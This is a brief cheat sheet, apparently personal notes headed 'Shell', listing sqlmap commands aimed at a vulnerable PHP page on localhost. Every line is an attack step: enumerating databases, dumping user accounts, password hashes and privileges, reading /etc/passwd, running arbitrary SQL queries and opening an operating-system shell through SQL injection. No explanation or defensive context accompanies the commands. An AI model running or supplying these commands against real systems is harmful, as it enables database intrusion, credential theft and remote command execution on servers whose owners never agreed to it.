<h1>Shell</h1>
shell exec php

python ./sqlmap.py -u "http://localhost/weak.php?id=10" --dbs
python sqlmap.py -u "http://localhost/weak.php?id=10" -b
python sqlmap.py -u "http://localhost/weak.php?id=10" --users --passwords --privileges --roles --threads=10
python sqlmap.py -u "http://localhost/weak.php?id=10" --current-user --is-dba --current-db --hostname --threads=10
python sqlmap.py -u "http://localhost/weak.php?id=10" --file-read=/etc/passwd --threads=10
python sqlmap.py -u "http://localhost/weak.php?id=10" --sql-query="select now();"
python sqlmap.py -u "http://localhost/weak.php?id=10" --os-shell
